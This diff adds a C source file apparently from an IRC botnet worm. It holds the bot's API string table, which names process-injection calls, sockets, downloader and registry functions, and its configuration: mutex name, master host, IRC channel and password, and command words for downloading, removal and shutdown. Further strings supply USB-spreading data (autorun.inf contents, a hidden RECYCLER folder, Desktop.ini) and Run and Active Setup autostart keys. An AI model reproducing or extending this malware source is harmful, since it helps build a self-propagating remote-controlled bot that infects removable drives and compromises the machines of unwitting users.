@@ -1,0 +1,239 @@
+char *apistr[] =
+{
+#define s_kernel32 0
+	"kernel32.dll",
+#define s_ws2_32 1
+	"ws2_32.dll",
+#define s_wininet 2
+	"wininet.dll", 
+#define s_shell32 3
+	"shell32.dll", 
+#define s_advapi32 4
+	"advapi32.dll",
+#define s_CreateToolhelp32Snapshot 5
+	"CreateToolhelp32Snapshot",
+#define s_Process32First 6
+	"Process32First",
+#define s_Process32Next 7
+	"Process32Next",
+#define s_OpenProcess 8
+	"OpenProcess",
+#define s_GetModuleFileNameA 9
+	"GetModuleFileNameA",
+#define s_VirtualAllocEx 10
+	"VirtualAllocEx",
+#define s_ZwWriteVirtualMemory 11
+	"ZwWriteVirtualMemory",
+#define s_CreateRemoteThread 12
+	"CreateRemoteThread",
+#define s_WaitForSingleObject 13
+	"WaitForSingleObject",
+#define s_CreateMutexA 14
+	"CreateMutexA",
+#define s_CreateThread 15
+	"CreateThread",
+#define s_ExitThread 16
+	"ExitThread", 
+#define s_Sleep 17
+	"Sleep",
+#define s_GetTickCount 18
+	"GetTickCount", 
+#define s_CreateFileA 19
+	"CreateFileA", 
+#define s_WriteFile 20
+	"WriteFile", 
+#define s_CloseHandle 21
+	"CloseHandle", 
+#define s_CreateProcessA 22
+	"CreateProcessA", 
+#define s_GetLogicalDriveStringsA 23
+	"GetLogicalDriveStringsA", 
+#define s_GetDriveTypeA 24
+	"GetDriveTypeA", 
+#define s_CreateDirectoryA 25
+	"CreateDirectoryA", 
+#define s_GetLastError 26
+	"GetLastError", 
+#define s_SetFileAttributesA 27
+	"SetFileAttributesA", 
+#define s_CopyFileA 28
+	"CopyFileA", 
+#define s_DeleteFileA 29
+	"DeleteFileA", 
+#define s_lstrlen 30
+	"lstrlen", 
+#define s_lstrcat 31
+	"lstrcat", 
+#define s_lstrcmp 32
+	"lstrcmp", 
+#define s_lstrcmpi 33
+	"lstrcmpi", 
+#define s_lstrcpyn 34
+	"lstrcpyn", 
+#define s_WSAStartup 35
+	"WSAStartup", 
+#define s_socket 36
+	"socket", 
+#define s_connect 37
+	"connect", 
+#define s_inet_addr 38
+	"inet_addr", 
+#define s_htons 39
+	"htons", 
+#define s_send 40
+	"send", 
+#define s_recv 41
+	"recv", 
+#define s_closesocket 42
+	"closesocket", 
+#define s_gethostbyname 43
+	"gethostbyname",
+#define s_InternetOpenA 44
+	"InternetOpenA",
+#define s_InternetOpenUrlA 45
+	"InternetOpenUrlA",
+#define s_InternetCloseHandle 46
+	"InternetCloseHandle",
+#define s_InternetReadFile 47
+	"InternetReadFile",
+#define s_ShellExecuteA 48
+	"ShellExecuteA",
+#define s_RegCreateKeyExA 49
+	"RegCreateKeyExA",
+#define s_RegSetValueExA 50
+	"RegSetValueExA",
+#define s_RegCloseKey 51
+	"RegCloseKey",
+#define s_RegDeleteKeyA 52
+	"RegDeleteKeyA",
+#define s_RegDeleteValueA 53
+	"RegDeleteValueA",
+#define s_ntdll 54
+	"ntdll.dll",
+	NULL
+};
+
+strings_s strings[] =
+{
+	/**************CONFIG-MAIN****************/
+	#define s_decodekey 0
+	{"qqq123", 1},
+	#define s_filename 1
+	{"autorun.exe", 1},
+	#define s_mutex 2
+	{"lkaksg", 1},
+	#define s_autostartkey 3
+	{"{08B0E5C0-4FCB-11CF-AAX5-00401C608512}", 1},
+	#define s_botversion 4
+	{"beta test v0.1", 1},
+	#define s_ircorderprefix 5
+	{"!", 1},
+	#define s_masterhost 6
+	{"fbi.gov", 1},
+	#define s_password 7
+	{NULL, 1},
+	#define s_channel 8
+	{"#pederi", 1},
+	#define s_channelpass 9
+	{"kurcevtest", 1},
+	#define s_channel_usb 10
+	{"#usb", 1},
+	/**************CONFIG-ORDERS****************/
+	#define s_order_version 11
+	{"v", 1},
+	#define s_order_die 12
+	{"d", 1},
+	#define s_order_r 13
+	{"r", 1},
+	#define s_order_r2 14
+	{"q", 1},
+	#define s_order_remove 15
+	{"odstrani", 1},
+	#define s_order_dl 16
+	{"nalozi", 1},
+	#define s_order_join 17
+	{"j", 1},
+	#define s_order_part 18
+	{"p", 1},
+	/**************IRC STRINGS****************/
+	#define s_pass 19
+	{"PASS ", 1},
+	#define s_nick 20
+	{"NICK ", 1},
+	#define s_user 21
+	{"USER ", 1},
+	#define s_motd 24
+	{"MOTD", 1},
+	#define s_ping 25
+	{"PING", 1},
+	#define s_pong 26
+	{"PONG ", 1},
+	#define s_join 27
+	{"JOIN ", 1},
+	#define s_part 28
+	{"PART ", 1},
+	#define s_privmsg 29
+	{"PRIVMSG", 1},
+	#define s_332 30
+	{"332", 1},
+	#define s_433 31
+	{"433", 1},
+	#define s_dbldot 32
+	{" :", 1},
+	#define s_space 34
+	{" ", 1},
+	#define s_usb_infect 35
+	{"Infected usb drive: ", 1},
+	/**************DOWNLOADER STRINGS****************/
+	#define s_internetopen 36
+	{"Mozilla", 1},
+	#define s_success 37
+	{"Success.", 1},
+	#define s_failed 38
+	{"Failed.", 1},
+	/**************USB-SPREAD STRINGS****************/
+	#define s_usb_recycler 39
+	{"\RECYCLER", 1},
+	#define s_usb_recsubdir 40
+	{"\S-1-5-21-1482476501-1644491937-682003330-1013", 1},
+	#define s_usb_desktopinidata 41
+	{"[.ShellClassInfo]
+CLSID={645FF040-5081-101B-9F08-00AA002F954E}", 1},
+	#define s_usb_desktopini 42
+	{"\Desktop.ini", 1},
+	#define s_usb_autoruninf 43
+	{"\autorun.inf", 1},
+	#define s_usb_autorundata1 44
+	{"[autorun]
+open=", 1},
+	#define s_usb_autorundata2 45
+	{"
+icon=%SystemRoot%\system32\SHELL32.dll,4
+action=Open folder to view files
+shell\open=Open
+shell\open\command=", 1},
+	#define s_usb_autorundata3 46
+	{"
+shell\open\default=1", 1},
+	/**************INSTALL STRINGS****************/
+	#define s_c 47
+	{"c:", 1},
+	#define s_dblslash 48
+	{"\", 1},
+	/**************AUTOSTART STRINGS****************/
+	#define s_autostartreg 49
+	{"Software\Microsoft\Active Setup\Installed Components", 1},
+	#define s_stubpath 50
+	{"StubPath", 1},
+	#define s_autostartreg_guestacc 51
+	{"Software\Microsoft\Windows\CurrentVersion\Run", 1},
+	#define s_autostartreg_def 52
+	{"Tester", 1},
+	/**************MISC****************/
+	#define s_order_silent 53
+	{"s", 1},
+	#define s_star 54
+	{"*", 1},
+	#define laststring 55
+	{NULL, 0}
+};
